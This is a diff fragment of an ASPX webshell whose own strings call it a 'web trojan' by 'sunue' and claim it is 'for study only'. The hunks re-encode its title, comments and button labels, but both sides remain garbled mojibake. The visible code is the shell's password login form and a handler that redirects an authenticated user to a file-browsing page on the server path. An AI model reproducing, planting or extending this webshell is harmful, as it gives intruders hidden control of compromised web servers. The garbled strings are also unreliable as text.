-Response.Write("<title>Äı¾Û¿Æ¼¼×¨ÓÃAspX´óÂí By:sunue</title>");
+Response.Write("<title>å‡èšç§‘æŠ€ä¸“ç”¨AspXå¤§é©¬ By:sunue</title>");
 
 }
 </script>
@@ -869,12 +868,12 @@ else
 {
 %>
 <form id="Form10" runat="server"> 
-<font color = "00c000">/*Ö»Ö§³ÖÊó±êµÇÂ¼£¬²»¿ÉÓÃ»Ø³µ*/</font></p>
-<font color = "00c000">/*¾¯¸æ:´ËÍøÒ³Ä¾Âí²ÉÓÃVisual C# 2005 ±àĞ´,½ö¹©Ñ§Ï°ÑĞ¾¿Ö®ÓÃ,²»µÃÓÃÓÚ·Ç·¨*/</font></p>
+<font color = "00c000">/*åªæ”¯æŒé¼ æ ‡ç™»å½•ï¼Œä¸å¯ç”¨å›è½¦*/</font></p>
+<font color = "00c000">/*è­¦å‘Š:æ­¤ç½‘é¡µæœ¨é©¬é‡‡ç”¨Visual C# 2005 ç¼–å†™,ä»…ä¾›å­¦ä¹ ç ”ç©¶ä¹‹ç”¨,ä¸å¾—ç”¨äºéæ³•*/</font></p>
 <table>
 <tr>
 <td><asp:TextBox ID="pass" runat="server" TextMode="Password" ForeColor = "#009900"></asp:TextBox></td>
-<td><asp:Button ID="Login" runat="server" OnClick="Login_Click" Text="µÇÂ¼" Width="56px" Height="26px"/></td>
+<td><asp:Button ID="Login" runat="server" OnClick="Login_Click" Text="ç™»å½•" Width="56px" Height="26px"/></td>
 </tr>
 </table>
 </form>
@@ -888,13 +887,13 @@ Session.Timeout = 90;
 Response.Redirect(Request.Url+"?page=index&src="+ Server.MapPath(".")+"\\");
 }
 else
-Response.Write("ÃÜÂë´íÎó");
+Response.Write("å¯†ç é”™è¯¯");
 }
 </script>
 <% 
 } 
 %>
 <hr>
-<table align="center"><font color="#009900">Äı¾Û¿Æ¼¼×¨ÓÃAspX´óÂí By:Äı¾Û¿Æ¼¼</font></table>
+<table align="center"><font color="#009900">å‡èšç§‘æŠ€ä¸“ç”¨AspXå¤§é©¬ By:å‡èšç§‘æŠ€</font></table>
 </table>
 
